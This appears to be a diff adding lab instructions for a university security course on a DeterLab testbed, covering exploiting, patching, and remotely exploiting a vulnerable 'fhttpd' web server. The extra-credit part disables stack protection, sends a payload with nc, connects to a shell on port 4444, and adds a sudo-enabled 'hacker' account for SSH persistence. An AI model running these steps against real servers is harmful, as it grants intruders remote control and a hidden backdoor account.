@@ -1,0 +1,39 @@
+# Exploitation Demo
+
+1. cd /usr/src/fhttpd
+2. sudo make
+3. sudo make install
+4. cd /root
+5. ./exploit1.sh
+6. telnet localhost 8080
+7. type "GET /" and press ENTER twice
+
+# Patch
+
+1. cd /usr/src/fhttpd/server
+2. patch < /root/part1/fixed.patch
+
+# Extra Credit: Remote Execution
+
+Open two terminals, one for the server (victim) and the other for deterlab user (attacker).
+
+## Server (server.la136cr-lab2.UCLA136.isi.deterlab.net)
+
+1. cd /usr/src/fhttpd
+2. add "-z execstack" option to Makefile webserver.c target
+2. sudo make
+3. sudo make install
+
+## DeterLab User (la136cr@users.deterlab.net)
+
+1. python payload.py > payload
+2. nc server.la136cr-lab2.UCLA136.isi.deterlab.net 8080 < payload
+3. open new terminal tab
+4. nc server.la136cr-lab2.UCLA136.isi.deterlab.net 4444
+5. touch attack.txt
+6. adduser hacker
+7. usermod -aG sudo hacker
+8. open new terminal tab
+9. ssh hacker@server.la136cr-lab2.UCLA136.isi.deterlab.net
+10. Enter the password you set in step 6
+11. Now you have a reliable remote access facility
